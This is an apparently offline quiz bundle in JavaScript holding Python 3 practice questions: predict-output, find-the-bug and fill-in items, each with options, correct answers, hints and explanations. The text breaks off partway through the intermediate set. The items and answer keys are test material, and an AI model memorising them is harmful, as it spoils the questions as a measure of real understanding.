/* SyntaxArena Standalone Offline Bundle (Works on file:/// and http://) */
(function() {

/* --- Start of data/python-questions.js --- */
/**
 * SyntaxArena Question Bank — Python 3 (Batch 4)
 * Exactly 60 curated challenges: 20 Beginner, 20 Intermediate, 20 Expert.
 * Standard: Python 3.10+
 * Source of truth: docs/QUESTION_SCHEMA.md
 */

var pythonQuestions = window.pythonQuestions = [
  // =========================================================================
  // PYTHON BEGINNER (20 QUESTIONS: py-beg-001 to py-beg-020)
  // =========================================================================
  {
    id: "py-beg-001",
    language: "python",
    difficulty: "beginner",
    type: "predict_output",
    topic: "data_structures",
    subtopic: "list_mutability",
    standardVersion: "Python 3.10+",
    prompt: "What is the exact stdout printed after executing this snippet?",
    code: "a = [1, 2, 3]\nb = a\nb.append(4)\nprint(len(a), a[-1])",
    options: ["3 3", "4 4", "3 4", "IndexError: list index out of range"],
    correctAnswer: "4 4",
    acceptedAnswers: ["4 4"],
    hint: "In Python, assigning a list to another variable (b = a) shares the reference to the same underlying mutable object.",
    explanation: "Because lists are mutable objects, assigning `b = a` points `b` to the exact same list in memory. Mutating `b` directly affects `a`. Thus `len(a)` is 4 and `a[-1]` evaluates to 4.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["lists", "mutability", "references"]
  },
  {
    id: "py-beg-002",
    language: "python",
    difficulty: "beginner",
    type: "multiple_choice",
    topic: "data_types",
    subtopic: "string_immutability",
    standardVersion: "Python 3.10+",
    prompt: "What happens when attempting to execute: `s = 'hello'; s[0] = 'H'`?",
    code: "s = 'hello'\ns[0] = 'H'",
    options: [
      "s becomes 'Hello'",
      "TypeError: 'str' object does not support item assignment",
      "ValueError: string index is read-only",
      "s remains 'hello' silently"
    ],
    correctAnswer: "TypeError: 'str' object does not support item assignment",
    acceptedAnswers: ["TypeError: 'str' object does not support item assignment"],
    hint: "Strings in Python are strictly immutable primitives. Their characters cannot be altered in-place.",
    explanation: "Python strings are immutable. Attempting to assign to an indexed character raises a `TypeError` because string buffers cannot be modified in place.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["strings", "immutability"]
  },
  {
    id: "py-beg-003",
    language: "python",
    difficulty: "beginner",
    type: "predict_output",
    topic: "operators",
    subtopic: "integer_division",
    standardVersion: "Python 3.10+",
    prompt: "What is the output of integer division `//` compared to float division `/`?",
    code: "x = 7 // 2\ny = 7 / 2\nprint(x, y)",
    options: ["3 3.5", "3.5 3.5", "3 3", "3.0 3.5"],
    correctAnswer: "3 3.5",
    acceptedAnswers: ["3 3.5"],
    hint: "The double slash `//` performs floor division returning an int, while single slash `/` always returns a float.",
    explanation: "In Python 3, `/` performs true division yielding `3.5` (a float), while `//` performs floor division truncating to the nearest integer `3`.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["operators", "math"]
  },
  {
    id: "py-beg-004",
    language: "python",
    difficulty: "beginner",
    type: "predict_output",
    topic: "sequences",
    subtopic: "slice_step",
    standardVersion: "Python 3.10+",
    prompt: "What is the result of using slice stride `[::-1]` on a string?",
    code: "msg = 'SyntaxArena'\nprint(msg[::-1][:4])",
    options: ["anre", "aner", "nera", "Synt"],
    correctAnswer: "aner",
    acceptedAnswers: ["aner"],
    hint: "Negative step `[::-1]` reverses the sequence from end to beginning.",
    explanation: "Reversing 'SyntaxArena' produces 'anerAxatnyS'. Taking the first 4 characters `[:4]` yields 'aner'.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["slicing", "strings"]
  },
  {
    id: "py-beg-005",
    language: "python",
    difficulty: "beginner",
    type: "predict_output",
    topic: "data_structures",
    subtopic: "dict_get",
    standardVersion: "Python 3.10+",
    prompt: "What does the dictionary `.get()` method return for a missing key with a fallback argument?",
    code: "scores = {'alice': 95, 'bob': 88}\nprint(scores.get('charlie', 0), scores.get('alice', 0))",
    options: ["0 95", "None 95", "KeyError 95", "0 0"],
    correctAnswer: "0 95",
    acceptedAnswers: ["0 95"],
    hint: "Unlike bracket indexing `scores['charlie']`, `.get(key, default)` returns the fallback without raising KeyError.",
    explanation: "The `.get()` method safely retrieves key values. Since 'charlie' does not exist, it evaluates to default 0. 'alice' exists, evaluating to 95.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["dictionaries", "methods"]
  },
  {
    id: "py-beg-006",
    language: "python",
    difficulty: "beginner",
    type: "predict_output",
    topic: "control_flow",
    subtopic: "range_step",
    standardVersion: "Python 3.10+",
    prompt: "What integers are generated by `range(1, 10, 3)`?",
    code: "vals = list(range(1, 10, 3))\nprint(vals)",
    options: ["[1, 4, 7]", "[1, 4, 7, 10]", "[3, 6, 9]", "[1, 3, 6, 9]"],
    correctAnswer: "[1, 4, 7]",
    acceptedAnswers: ["[1, 4, 7]"],
    hint: "Range generates values starting at start (inclusive), stepping by step, and stopping strictly before stop (exclusive).",
    explanation: "Starting at 1 with step 3 produces 1, 4, 7. The next candidate 10 is equal to the stop bound, so it is excluded: `[1, 4, 7]`.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["range", "loops"]
  },
  {
    id: "py-beg-007",
    language: "python",
    difficulty: "beginner",
    type: "predict_output",
    topic: "types",
    subtopic: "truthiness",
    standardVersion: "Python 3.10+",
    prompt: "What is printed by evaluating the boolean truth value of empty sequences in Python?",
    code: "print(bool([]), bool(''), bool(0), bool([0]))",
    options: [
      "False False False True",
      "False False False False",
      "True False False True",
      "False True False True"
    ],
    correctAnswer: "False False False True",
    acceptedAnswers: ["False False False True"],
    hint: "Empty collections, empty strings, and numeric zero are falsy. Non-empty collections are always truthy.",
    explanation: "In Python, `[]`, `''`, and `0` are all falsy, returning `False`. However, `[0]` is a non-empty list containing one element, making it truthy (`True`).",
    points: 100,
    estimatedSeconds: 30,
    tags: ["boolean", "truthiness"]
  },
  {
    id: "py-beg-008",
    language: "python",
    difficulty: "beginner",
    type: "predict_output",
    topic: "strings",
    subtopic: "split_default",
    standardVersion: "Python 3.10+",
    prompt: "How does `str.split()` handle consecutive whitespace when called without arguments?",
    code: "text = '  code   studio   arena  '\nparts = text.split()\nprint(len(parts), parts[0])",
    options: ["3 code", "5 code", "3 ''", "7 studio"],
    correctAnswer: "3 code",
    acceptedAnswers: ["3 code"],
    hint: "Calling `.split()` without arguments groups runs of consecutive whitespace and discards leading/trailing spaces.",
    explanation: "When `split()` is called with no arguments, it strips leading and trailing whitespace and groups any consecutive whitespace as a single separator, returning `['code', 'studio', 'arena']` of length 3.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["strings", "methods"]
  },
  {
    id: "py-beg-009",
    language: "python",
    difficulty: "beginner",
    type: "predict_output",
    topic: "data_structures",
    subtopic: "list_pop",
    standardVersion: "Python 3.10+",
    prompt: "What does `list.pop(0)` return and how does it modify the list?",
    code: "items = ['a', 'b', 'c']\nfirst = items.pop(0)\nprint(first, items)",
    options: [
      "a ['b', 'c']",
      "c ['a', 'b']",
      "['b', 'c'] a",
      "None ['b', 'c']"
    ],
    correctAnswer: "a ['b', 'c']",
    acceptedAnswers: ["a ['b', 'c']"],
    hint: "The `.pop(index)` method removes the element at the specified index and returns its value.",
    explanation: "`pop(0)` removes and returns the element at index 0 ('a'). The remaining list is `['b', 'c']`.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["lists", "methods"]
  },
  {
    id: "py-beg-010",
    language: "python",
    difficulty: "beginner",
    type: "predict_output",
    topic: "data_structures",
    subtopic: "tuple_comma",
    standardVersion: "Python 3.10+",
    prompt: "What is the type of `(42)` versus `(42,)`?",
    code: "x = (42)\ny = (42,)\nprint(type(x).__name__, type(y).__name__)",
    options: ["int tuple", "tuple tuple", "int int", "tuple list"],
    correctAnswer: "int tuple",
    acceptedAnswers: ["int tuple"],
    hint: "Parentheses alone indicate grouping in expressions; a trailing comma is required to define a single-element tuple.",
    explanation: "In Python, `(42)` is merely an integer wrapped in grouping parentheses, yielding type `int`. To construct a singleton tuple, a trailing comma is mandatory: `(42,)` yields `tuple`.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["tuples", "syntax"]
  },
  {
    id: "py-beg-011",
    language: "python",
    difficulty: "beginner",
    type: "find_bug",
    topic: "control_flow",
    subtopic: "off_by_one",
    standardVersion: "Python 3.10+",
    prompt: "Identify the line that raises an IndexError due to an off-by-one upper bound:",
    code: "names = ['Ada', 'Linus', 'Guido']\nfor i in range(len(names) + 1):\n    print(names[i])",
    targetLine: 3,
    correctAnswer: 3,
    acceptedAnswers: [3, "3"],
    hint: "When i reaches len(names), accessing names[i] exceeds the zero-based array limit.",
    explanation: "Line 2 iterates `range(4)` which includes indices 0, 1, 2, and 3. On line 3, `names[3]` raises `IndexError` because the valid indices for a 3-element list are only 0, 1, and 2.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["debugging", "indexing"]
  },
  {
    id: "py-beg-012",
    language: "python",
    difficulty: "beginner",
    type: "find_bug",
    topic: "data_structures",
    subtopic: "mutating_iteration",
    standardVersion: "Python 3.10+",
    prompt: "Identify the line that introduces a logical error by mutating the list while iterating directly over it:",
    code: "nums = [1, 2, 3, 4, 5]\nfor n in nums:\n    if n % 2 == 0:\n        nums.remove(n)\nprint(nums)",
    targetLine: 4,
    correctAnswer: 4,
    acceptedAnswers: [4, "4"],
    hint: "Mutating a collection (adding or removing) during forward iteration skips subsequent elements.",
    explanation: "Line 4 calls `nums.remove(n)` while iterating over `nums`. When an element is removed, the remaining elements shift left, causing the iterator's internal index to skip evaluating the adjacent element.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["debugging", "lists", "iteration"]
  },
  {
    id: "py-beg-013",
    language: "python",
    difficulty: "beginner",
    type: "fill_code",
    topic: "functions",
    subtopic: "definition_syntax",
    standardVersion: "Python 3.10+",
    prompt: "Complete the function definition keyword so that the code defines a function named `double`:",
    code: "___BLANK_1___ double(n):\n    return n * 2",
    blankCount: 1,
    options: ["def", "function", "fn", "fun"],
    correctAnswer: "def",
    acceptedAnswers: ["def"],
    hint: "Python uses the three-letter keyword `def` to define standard functions.",
    explanation: "In Python, functions are declared with the `def` keyword followed by the function identifier, parameters, and a colon.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["functions", "syntax"]
  },
  {
    id: "py-beg-014",
    language: "python",
    difficulty: "beginner",
    type: "fill_code",
    topic: "control_flow",
    subtopic: "conditional_branching",
    standardVersion: "Python 3.10+",
    prompt: "Fill in the blank keyword for the secondary conditional branch in Python:",
    code: "score = 85\nif score >= 90:\n    grade = 'A'\n___BLANK_1___ score >= 80:\n    grade = 'B'\nelse:\n    grade = 'C'",
    blankCount: 1,
    options: ["elif", "else if", "elsif", "elseif"],
    correctAnswer: "elif",
    acceptedAnswers: ["elif"],
    hint: "Python contracts 'else if' into a single four-letter keyword.",
    explanation: "Python uses `elif` (short for else if) for subsequent conditional branches. 'else if' or 'elsif' are syntax errors.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["syntax", "conditionals"]
  },
  {
    id: "py-beg-015",
    language: "python",
    difficulty: "beginner",
    type: "code_tracing",
    topic: "control_flow",
    subtopic: "nested_loops",
    standardVersion: "Python 3.10+",
    prompt: "Trace the execution of this nested loop and calculate the final value of `total`:",
    code: "total = 0\nfor i in range(1, 3):\n    for j in range(2):\n        total += i * j\nprint(total)",
    options: ["3", "4", "6", "2"],
    correctAnswer: "3",
    acceptedAnswers: ["3", 3],
    hint: "Outer loop has i = 1, then i = 2. Inner loop has j = 0, then j = 1.",
    explanation: "When i=1: j=0 -> total += 0; j=1 -> total += 1 (total=1). When i=2: j=0 -> total += 0; j=1 -> total += 2 (total=3). Final total = 3.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["tracing", "loops"]
  },
  {
    id: "py-beg-016",
    language: "python",
    difficulty: "beginner",
    type: "predict_output",
    topic: "data_structures",
    subtopic: "set_deduplication",
    standardVersion: "Python 3.10+",
    prompt: "What is the length of the set created from duplicate items?",
    code: "data = [1, 2, 2, 3, 3, 3, 4]\nunique = set(data)\nprint(len(unique))",
    options: ["4", "7", "3", "1"],
    correctAnswer: "4",
    acceptedAnswers: ["4", 4],
    hint: "Sets enforce unique elements and eliminate all duplicate values.",
    explanation: "Converting `data` to a set discards redundant occurrences, leaving distinct elements `{1, 2, 3, 4}`, which has length 4.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["sets", "collections"]
  },
  {
    id: "py-beg-017",
    language: "python",
    difficulty: "beginner",
    type: "predict_output",
    topic: "functions",
    subtopic: "default_arguments",
    standardVersion: "Python 3.10+",
    prompt: "What is printed when calling a function with a mutable default argument multiple times?",
    code: "def add_item(val, bucket=[]):\n    bucket.append(val)\n    return bucket\n\nadd_item(1)\nprint(add_item(2))",
    options: ["[1, 2]", "[2]", "[1]", "TypeError"],
    correctAnswer: "[1, 2]",
    acceptedAnswers: ["[1, 2]"],
    hint: "Default parameter expressions in Python are evaluated once at function definition time, not on every call.",
    explanation: "The default list `bucket=[]` is created once when the function is defined. Successive calls without a second argument append to the same shared list in memory, yielding `[1, 2]`.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["functions", "gotchas"]
  },
  {
    id: "py-beg-018",
    language: "python",
    difficulty: "beginner",
    type: "predict_output",
    topic: "data_structures",
    subtopic: "list_multiplication",
    standardVersion: "Python 3.10+",
    prompt: "What is the output of modifying one element in a nested list created with `*`?",
    code: "matrix = [[0] * 2] * 2\nmatrix[0][0] = 9\nprint(matrix)",
    options: ["[[9, 0], [9, 0]]", "[[9, 0], [0, 0]]", "[[9, 9], [0, 0]]", "[[0, 0], [0, 0]]"],
    correctAnswer: "[[9, 0], [9, 0]]",
    acceptedAnswers: ["[[9, 0], [9, 0]]"],
    hint: "The outer `* 2` replicates the reference to the single inner list rather than creating deep copies.",
    explanation: "`[[0] * 2] * 2` creates an outer list containing two references pointing to the exact same inner list. Mutating index 0 of the first list reflects in the second: `[[9, 0], [9, 0]]`.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["lists", "shallow_copy"]
  },
  {
    id: "py-beg-019",
    language: "python",
    difficulty: "beginner",
    type: "predict_output",
    topic: "strings",
    subtopic: "f_strings",
    standardVersion: "Python 3.10+",
    prompt: "What output is produced by this formatted f-string expression?",
    code: "val = 5\nprint(f'{val * 3}:{val > 2}')",
    options: ["15:True", "15:val > 2", "5 * 3:True", "SyntaxError"],
    correctAnswer: "15:True",
    acceptedAnswers: ["15:True"],
    hint: "Expressions inside f-string braces `{}` are evaluated dynamically at runtime.",
    explanation: "`{val * 3}` evaluates to `15`, and `{val > 2}` evaluates to `True`. Concatenated with the colon, the output is '15:True'.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["strings", "formatting"]
  },
  {
    id: "py-beg-020",
    language: "python",
    difficulty: "beginner",
    type: "multiple_choice",
    topic: "data_structures",
    subtopic: "in_operator",
    standardVersion: "Python 3.10+",
    prompt: "What does the expression `'val' in {'val': 100, 'score': 50}` check?",
    code: "res = 'val' in {'val': 100, 'score': 50}",
    options: [
      "Whether 'val' exists as a key in the dictionary",
      "Whether 'val' exists as a value in the dictionary",
      "Both keys and values simultaneously",
      "Raises a TypeError on dictionary operands"
    ],
    correctAnswer: "Whether 'val' exists as a key in the dictionary",
    acceptedAnswers: ["Whether 'val' exists as a key in the dictionary"],
    hint: "By default, dictionary membership testing evaluates against the keys view.",
    explanation: "In Python, the `in` operator on a dictionary checks for key presence in $O(1)$ average time. To check values, one must explicitly use `.values()`.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["dictionaries", "operators"]
  },

  // =========================================================================
  // PYTHON INTERMEDIATE (20 QUESTIONS: py-int-001 to py-int-020)
  // =========================================================================
  {
    id: "py-int-001",
    language: "python",
    difficulty: "intermediate",
    type: "predict_output",
    topic: "sequences",
    subtopic: "slice_reassignment",
    standardVersion: "Python 3.10+",
    prompt: "What is the exact stdout printed after executing this slice reassignment?",
    code: "nums = [1, 2, 3, 4, 5]\nnums[1:4] = [20, 30]\nprint(len(nums), nums)",
    options: [
      "5 [1, 20, 30, 4, 5]",
      "4 [1, 20, 30, 5]",
      "4 [1, 2, 20, 30]",
      "TypeError: slice mismatch"
    ],
    correctAnswer: "4 [1, 20, 30, 5]",
    acceptedAnswers: ["4 [1, 20, 30, 5]"],
    hint: "Slice assignment replaces the targeted index range [1:4] (elements 2, 3, 4) with the contents of the right-hand sequence.",
    explanation: "Slice assignment `nums[1:4]` selects items at indices 1, 2, and 3 (`[2, 3, 4]`) and replaces them with `[20, 30]`. The list dynamically resizes from 5 elements to 4: `[1, 20, 30, 5]`.",
    points: 200,
    estimatedSeconds: 45,
    tags: ["slicing", "mutation"]
  },
  {
    id: "py-int-002",
    language: "python",
    difficulty: "intermediate",
    type: "predict_output",
    topic: "comprehensions",
    subtopic: "scope_isolation",
    standardVersion: "Python 3.10+",
    prompt: "In Python 3, does the loop variable of a list comprehension leak into the surrounding scope?",
    code: "x = 'outer'\nitems = [x for x in range(3)]\nprint(x)",
    options: ["outer", "2", "3", "NameError"],
    correctAnswer: "outer",
    acceptedAnswers: ["outer"],
    hint: "In Python 3, list comprehensions have their own local function-like scope.",
    explanation: "Unlike Python 2 where loop variables leaked into the local namespace, Python 3 executes list comprehensions in a dedicated nested scope. The outer `x` remains unaffected ('outer').",
    points: 200,
    estimatedSeconds: 45,
    tags: ["comprehensions", "scoping"]
  },
  {
    id: "py-int-003",
    language: "python",
    difficulty: "intermediate",
    type: "predict_output",
    topic: "comprehensions",
    subtopic: "dict_collision",
    standardVersion: "Python 3.10+",
    prompt: "What dictionary is produced when dictionary comprehension keys collide?",
    code: "d = {i % 2: i for i in range(5)}\nprint(d)",
    options: ["{0: 4, 1: 3}", "{0: 0, 1: 1}", "{0: 2, 1: 3}", "{0: [0, 2, 4], 1: [1, 3]}"],
    correctAnswer: "{0: 4, 1: 3}",
    acceptedAnswers: ["{0: 4, 1: 3}"],
    hint: "When duplicate keys are evaluated, the latest assignment overwrites prior values.",
    explanation: "For i=0: 0->0. For i=1: 1->1. For i=2: 0->2 (overwrites). For i=3: 1->3 (overwrites). For i=4: 0->4 (overwrites). Final dictionary is `{0: 4, 1: 3}`.",
    points: 200,
    estimatedSeconds: 45,
    tags: ["dictionaries", "comprehensions"]
  },
  {
    id: "py-int-004",
    language: "python",
    difficulty: "intermediate",
    type: "predict_output",
    topic: "functions",
    subtopic: "args_kwargs",
    standardVersion: "Python 3.10+",
    prompt: "What types do `*args` and `**kwargs` arrive as inside a function body?",
    code: "def examine(*args, **kwargs):\n    print(type(args).__name__, type(kwargs).__name__)\n\nexamine(1, 2, mode='fast')",
    options: ["tuple dict", "list dict", "tuple list", "tuple tuple"],
    correctAnswer: "tuple dict",
    acceptedAnswers: ["tuple dict"],
    hint: "Positional varargs are collected into an immutable sequence, while keyword varargs form key-value pairs.",
    explanation: "In Python, `*args` packs variable positional arguments into an immutable `tuple`, while `**kwargs` packs keyword arguments into a standard `dict`.",
    points: 200,
    estimatedSeconds: 45,
    tags: ["functions", "parameters"]
  },
  {
    id: "py-int-005",
    language: "python",
    difficulty: "intermediate",
    type: "predict_output",
    topic: "iterators",
    subtopic: "generators",
    standardVersion: "Python 3.10+",
    prompt: "What sequence of values is emitted across successive `next()` calls to this generator?",
    code: "def gen():\n    yield 1\n    yield 2\n    yield 3\n\ng = gen()\nprint(next(g), next(g), list(g))",
    options: ["1 2 [3]", "1 2 [1, 2, 3]", "1 1 [2, 3]", "1 2 []"],
    correctAnswer: "1 2 [3]",
    acceptedAnswers: ["1 2 [3]"],
    hint: "Generators retain state between yields; converting an active generator to a list exhausts remaining items.",
    explanation: "First `next(g)` yields 1. Second `next(g)` yields 2. Calling `list(g)` consumes the remaining unyielded item 3 into `[3]`, leaving the generator exhausted.",
    points: 200,
    estimatedSeconds: 45,
    tags: ["generators", "iterators"]
  },
  {
    id: "py-int-006",
    language: "python",
    difficulty: "intermediate",
    type: "predict_output",
    topic: "exceptions",
    subtopic: "finally_return",
    standardVersion: "Python 3.10+",
    prompt: "What value is returned when both `try` and `finally` contain `return` statements?",
    code: "def check():\n    try:\n        return 'TRY'\n    finally:\n        return 'FINALLY'\n\nprint(check())",
    options: ["FINALLY", "TRY", "TRY FINALLY", "SyntaxError"],
    correctAnswer: "FINALLY",
    acceptedAnswers: ["FINALLY"],
    hint: "The `finally` block is guaranteed to execute before leaving the function, overriding prior pending return values.",
    explanation: "If a `finally` block executes a `return` or `break` statement, the saved return value from the `try` or `except` block is discarded in favor of the `finally` return.",
    points: 200,
    estimatedSeconds: 45,
    tags: ["exceptions", "control_flow"]
  },
  {
    id: "py-int-007",
    language: "python",
    difficulty: "intermediate",
    type: "predict_output",
    topic: "memory",
    subtopic: "shallow_vs_deepcopy",
    standardVersion: "Python 3.10+",
    prompt: "How does mutating a nested list affect a shallow copy produced by `copy.copy`?",
    code: "import copy\norig = [[1, 2], [3, 4]]\nclone = copy.copy(orig)\nclone[0].append(99)\nprint(orig[0])",
    options: ["[1, 2, 99]", "[1, 2]", "[99]", "AttributeError"],
    correctAnswer: "[1, 2, 99]",
    acceptedAnswers: ["[1, 2, 99]"],
    hint: "A shallow copy creates a new outer collection, but inserts references to the original inner objects.",
    explanation: "Shallow copying copies the outer container while preserving references to the nested lists. Modifying `clone[0]` mutates the shared inner list object, reflecting in `orig[0]`.",
    points: 200,
    estimatedSeconds: 45,
    tags: ["copy", "references"]
  },
  {
    id: "py-int-008",
    language: "python",
    difficulty: "intermediate",
    type: "code_tracing",
    topic: "functions",
    subtopic: "decorators",
    standardVersion: "Python 3.10+",
    prompt: "Trace the execution order of this simple function decorator:",
    code: "def announce(func):\n    def wrapper(n):\n        return func(n) * 2\n    return wrapper\n\n@announce\ndef add_five(x):\n    return x + 5\n\nprint(add_five(3))",
    options: ["16", "11", "13", "8"],
    correctAnswer: "16",
    acceptedAnswers: ["16", 16],
    hint: "The @announce decorator replaces add_five with wrapper, evaluating func(3) * 2.",
    explanation: "`add_five(3)` calls `wrapper(3)`. Inside wrapper: `func(3)` evaluates `3 + 5 = 8`. Then `8 * 2 = 16`.",
    points: 200,
    estimatedSeconds: 45,
    tags: ["decorators", "tracing"]
  },
  {
    id: "py-int-009",
    language: "python",
    difficulty: "intermediate",
    type: "predict_output",
    topic: "algorithms",
    subtopic: "custom_sort",
    standardVersion: "Python 3.10+",
    prompt: "What order is produced by sorting tuples with a custom lambda key?",
    code: "pairs = [(1, 'b'), (2, 'a'), (3, 'b')]\npairs.sort(key=lambda p: (p[1], -p[0]))\nprint(pairs[0])",
    options: ["(2, 'a')", "(1, 'b')", "(3, 'b')", "(2, 'b')"],
    correctAnswer: "(2, 'a')",
    acceptedAnswers: ["(2, 'a')"],
    hint: "Tuples in Python sort lexicographically: first by p[1] ('a' < 'b'), then by second component -p[0].",
    explanation: "Sorting compares primary key `p[1]`. 'a' comes before 'b', so `(2, 'a')` is unambiguously the first element in sorted order.",
    points: 200,
    estimatedSeconds: 45,
    tags: ["sorting", "lambdas"]
  },
  {
    id: "py-int-010",
    language: "python",
    difficulty: "intermediate",
    type: "predict_output",
    topic: "iterators",
    subtopic: "zip_truncation",
    standardVersion: "Python 3.10+",
    prompt: "What is the length of `list(zip(a, b))` when iterables have unequal lengths?",
    code: "a = [1, 2, 3, 4, 5]\nb = ['x', 'y']\nprint(len(list(zip(a, b))))",
    options: ["2", "5", "7", "ValueError"],
    correctAnswer: "2",
    acceptedAnswers: ["2", 2],
    hint: "Standard `zip()` terminates as soon as the shortest input iterable is exhausted.",
    explanation: "In Python, `zip()` stops generating pairs as soon as any input iterable is exhausted. Since `b` has length 2, `zip(a, b)` yields exactly 2 tuples.",
    points: 200,
    estimatedSeconds: 45,
    tags: ["iterators", "zip"]
  },
  {
    id: "py-int-011",
    language: "python",
    difficulty: "intermediate",
    type: "find_bug",
    topic: "scoping",
    subtopic: "unbound_local",
    standardVersion: "Python 3.10+",
    prompt: "Identify the line that raises an UnboundLocalError by assigning to a variable in local scope without global declaration:",
    code: "counter = 0\ndef increment():\n    counter = counter + 1\n    return counter\nincrement()",
    targetLine: 3,
    correctAnswer: 3,
    acceptedAnswers: [3, "3"],
    hint: "Assigning to a variable inside a function makes it local to that function throughout its entire body.",
    explanation: "Because `counter` is assigned on line 3 (`counter = ...`), Python marks `counter` as a local variable for the entire function. When line 3 attempts to read `counter + 1` before assignment, it raises `UnboundLocalError`.",
    points: 200,
    estimatedSeconds: 45,
    tags: ["scoping", "debugging"]
  },
  {
    id: "py-int-012",
    language: "python",
    difficulty: "intermediate",
    type: "find_bug",
    topic: "oop",
    subtopic: "missing_self",
    standardVersion: "Python 3.10+",
    prompt: "Identify the line containing a method definition that improperly omits the explicit instance receiver parameter:",
    code: "class Greeter:\n    def __init__(self, name):\n        self.name = name\n    def greet():\n        return 'Hello!'",
    targetLine: 4,
    correctAnswer: 4,
    acceptedAnswers: [4, "4"],
    hint: "Standard Python instance methods must take `self` as their first parameter.",
    explanation: "Line 4 defines `def greet():` with zero parameters. When invoked on an instance (`Greeter('A').greet()`), Python passes the instance implicitly as the first argument, raising a `TypeError` due to the missing `self`.",
    points: 200,
    estimatedSeconds: 45,
    tags: ["oop", "debugging"]
  },
  {
    id: "py-int-013",
    language: "python",
    difficulty: "intermediate",
    type: "fill_code",
    topic: "generators",
    subtopic: "delegation",
    standardVersion: "Python 3.10+",
    prompt: "Fill in the two-word keyword for delegating sub-generator iteration in Python 3.3+:",
    code: "def flat(tree):\n    for item in tree:\n        if isinstance(item, list):\n            ___BLANK_1___ flat(item)\n        else:\n            yield item",
    blankCount: 1,
    options: ["yield from", "yield", "return from", "delegate"],
    correctAnswer: "yield from",
    acceptedAnswers: ["yield from"],
    hint: "The syntax combines `yield` with an English preposition to delegate to a sub-iterator.",
    explanation: "`yield from <iterable>` transparently delegates iteration to a sub-generator, forwarding yielded values and establishing bidirectional communication.",
    points: 200,
    estimatedSeconds: 45,
    tags: ["generators", "syntax"]
  },
  {
    id: "py-int-014",
    language: "python",
    difficulty: "intermediate",
    type: "fill_code",
    topic: "context_managers",
    subtopic: "protocol_methods",
    standardVersion: "Python 3.10+",
    prompt: "Complete the exit dunder method name required by Python's Context Manager protocol:",
    code: "class ManagedResource:\n    def __enter__(self):\n        return self\n    def ___BLANK_1___(self, exc_type, exc_val, exc_tb):\n        pass",
    blankCount: 1,
    options: ["__exit__", "__close__", "__del__", "__stop__"],
    correctAnswer: "__exit__",
    acceptedAnswers: ["__exit__"],
    hint: "Context managers paired with `with` blocks require `__enter__` and this complementary teardown method.",
    explanation: "Python's context manager protocol requires `__enter__(self)` and `__exit__(self, exc_type, exc_val, exc_tb)`.",
    points: 200,
    estimatedSeconds: 45,
    tags: ["context_managers", "oop"]
  },
  {
    id: "py-int-015",
    language: "python",
    difficulty: "intermediate",
    type: "code_tracing",
    topic: "recursion",
    subtopic: "memoization",
    standardVersion: "Python 3.10+",
    prompt: "Trace the execution of this memoized recursive call calculating `f(4)`:",
    code: "memo = {0: 0, 1: 1}\ndef f(n):\n    if n not in memo:\n        memo[n] = f(n - 1) + f(n - 2)\n    return memo[n]\n\nprint(f(4))",
    options: ["3", "5", "2", "8"],
    correctAnswer: "3",
    acceptedAnswers: ["3", 3],
    hint: "Fibonacci sequence: f(0)=0, f(1)=1, f(2)=1, f(3)=2, f(4)=3.",
    explanation: "f(2) = 1 + 0 = 1. f(3) = 1 + 1 = 2. f(4) = 2 + 1 = 3. Output is 3.",
    points: 200,
    estimatedSeconds: 45,
    tags: ["recursion", "memoization"]
  },
  {
    id: "py-int-016",
    language: "python",
    difficulty: "intermediate",
    type: "predict_output",
    topic: "oop",
    subtopic: "property_decorator",
    standardVersion: "Python 3.10+",
    prompt: "What is printed when accessing and setting a managed `@property`?",
    code: "class Box:\n    def __init__(self, size):\n        self._size = size\n    @property\n    def size(self):\n        return self._size * 2\n\nb = Box(5)\nprint(b.size)",
    options: ["10", "5", "<property object>", "AttributeError"],
    correctAnswer: "10",
    acceptedAnswers: ["10", 10],
    hint: "The `@property` decorator turns a method into a read-only getter attribute accessed without parentheses.",
    explanation: "`b.size` invokes the getter method transparently, computing `self._size * 2` which evaluates to `5 * 2 = 10`.",
    points: 200,
    estimatedSeconds: 45,
    tags: ["oop", "properties"]
  },
  {
    id: "py-int-017",
    language: "python",
    difficulty: "intermediate",
    type: "multiple_choice",
    topic: "memory",
    subtopic: "integer_interning",
    standardVersion: "Python 3.10+",
    prompt: "Why does `256 is 256` evaluate to `True`, but `1000 is 1000` may evaluate to `False` in interactive Python?",
    code: "a = 256; b = 256\nc = 1000; d = 1000",
    options: [
      "CPython pre-allocates and interns small integers in the range [-5, 256]",
      "Integers larger than 256 overflow 8-bit memory boundaries",
      "Python automatically converts large numbers into floats",
      "The `is` operator is deprecated for integers"
    ],
    correctAnswer: "CPython pre-allocates and interns small integers in the range [-5, 256]",
    acceptedAnswers: ["CPython pre-allocates and interns small integers in the range [-5, 256]"],
    hint: "CPython maintains an internal global array of singleton objects for small frequently-used numbers.",
    explanation: "CPython caches an array of integer objects for values between -5 and 256. Any reference to these numbers shares the exact same memory address (so `is` evaluates to `True`). Numbers outside this range create distinct heap objects.",
    points: 200,
    estimatedSeconds: 45,
    tags: ["memory", "interning"]
  },
  {
    id: "py-int-018",
    language: "python",
    difficulty: "intermediate",
    type: "predict_output",
    topic: "control_flow",
    subtopic: "short_circuit",
    standardVersion: "Python 3.10+",
    prompt: "What value is returned by the short-circuiting logical expression `0 or 'default' and [1, 2]`?",
    code: "res = 0 or 'default' and [1, 2]\nprint(res)",
    options: ["[1, 2]", "'default'", "0", "True"],
    correctAnswer: "[1, 2]",
    acceptedAnswers: ["[1, 2]"],
    hint: "`and` has higher precedence than `or`. Both operators return the actual evaluated operand, not boolean True/False.",
